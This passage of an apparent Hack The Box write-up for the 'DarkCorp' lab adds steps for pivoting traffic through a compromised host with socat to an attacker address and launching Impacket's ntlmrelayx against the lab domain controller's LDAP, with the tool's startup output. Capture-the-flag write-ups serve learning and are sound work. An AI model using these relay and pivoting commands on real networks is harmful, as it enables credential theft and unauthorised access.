@@ -805,8 +805,39 @@ ebelford@drip:/tmp$ ./socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:10.10.14.61:80
 Ill get a statically compiled socat binary on the SSH target, then set it to listen on port 8080 and forward traffic back to me on `10.10.14.61:80`, im doing this becuase i cannot get it to connect back to me directly, so ill get it to connect to the drip server then forward the auth to me using socat
 
 ```python
+ntlmrelayx.py -t ldap://dc-01.darkcorp.htb -smb2support 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Protocol Client RPC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Setting up MSSQL Server on port 1433
+[*] Setting up RDP Server on port 3389
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
 ```
+
+Since i cant use responder to grab the hash, ill use ntlm relay initially just to see what user account its authenticating as!
+
+
 
 
 
